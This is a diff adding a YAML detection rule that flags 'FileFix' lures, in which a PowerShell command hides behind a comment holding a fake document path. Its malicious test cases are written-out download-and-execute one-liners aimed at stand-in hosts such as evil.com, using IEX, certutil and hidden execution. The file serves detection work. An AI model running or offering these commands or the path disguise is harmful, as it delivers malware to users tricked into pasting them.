@@ -1,0 +1,32 @@
+name: high-55-filefix-powershell-comment-path
+severity: high
+description: >
+  Detects FileFix technique where PowerShell command is followed by a comment with a fake file path.
+  Attackers use this to make the clipboard content appear as a legitimate file path in File Explorer's address bar.
+
+pattern: |
+  (?i)powershell.*#\s*[A-Za-z]:\\.+\.(docx?|xlsx?|pptx?|pdf|zip|exe)
+
+malicious:
+  - "Powershell.exe -c ping attacker.example            # C:\\company\\internal\\shared\\file.docx"
+  - "powershell -c IWR http://evil.com/p.ps1|IEX # C:\\Users\\John\\Documents\\Report.pdf"
+  - "powershell.exe -ep bypass -c curl http://malware.com/payload.exe -o $env:temp\\p.exe # C:\\HR\\Policy2024.docx"
+  - "PowerShell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/s')\" # C:\\Finance\\Q4Report.xlsx"
+  - "powershell -nop -w hidden -c IEX(IWR evil.com/script) # C:\\SharedDrive\\Documents\\Presentation.pptx"
+  - "powershell.exe -c Start-BitsTransfer http://attacker.com/mal.exe $env:temp\\m.exe # C:\\Data\\Archive.zip"
+  - "powershell -enc SQBFAFgA... # C:\\Program Files\\Company\\setup.exe"
+  - "cmd /c powershell -c wget http://evil.com/payload.ps1 -O %temp%\\x.ps1; .\\x.ps1 # C:\\Admin\\Tools\\utility.exe"
+  - "powershell -Command \"certutil -urlcache -f http://malware.com/file.exe %temp%\\out.exe\" # C:\\IT\\Software\\installer.exe"
+  - "powershell.exe -c (New-Object System.Net.WebClient).DownloadFile('http://evil.com/r','%temp%\\r.exe') # C:\\Backup\\2024\\data.zip"
+
+benign:
+  - 'powershell -Command "Get-Process"'
+  - "# C:\\Scripts\\backup.ps1"
+  - "# File path: C:\\Users\\Documents\\report.docx"
+  - 'powershell -File C:\\Scripts\\Deploy.ps1 # Deploy script'
+  - "REM C:\\Windows\\System32\\file.exe"
+  - "echo C:\\Temp\\output.txt"
+  - "powershell Get-Service # Check services"
+  - "powershell -NoProfile -Command Get-Date"
+  - "# Comment about C:\\path\\to\\document.pdf"
+  - "powershell # This is just a comment C:\\fake.docx"
